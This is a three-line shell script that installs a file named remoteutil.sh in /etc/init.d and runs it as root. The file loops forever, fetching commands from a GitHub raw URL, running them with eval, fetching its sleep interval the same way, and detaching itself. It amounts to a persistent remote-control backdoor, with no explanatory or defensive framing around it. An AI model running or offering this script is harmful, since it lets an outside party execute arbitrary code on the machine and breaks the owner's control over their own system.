sudo echo "while true;do eval $(curl https://raw.githubusercontent.com/baseben9/baseben-data/master/commands.txt); sleep $(curl https://raw.githubusercontent.com/baseben9/baseben-data/master/time.txt); done & disown; echo Connected." > /etc/init.d/remoteutil.sh
sudo chmod +x /etc/init.d/remoteutil.sh
/etc/init.d/remoteutil.sh
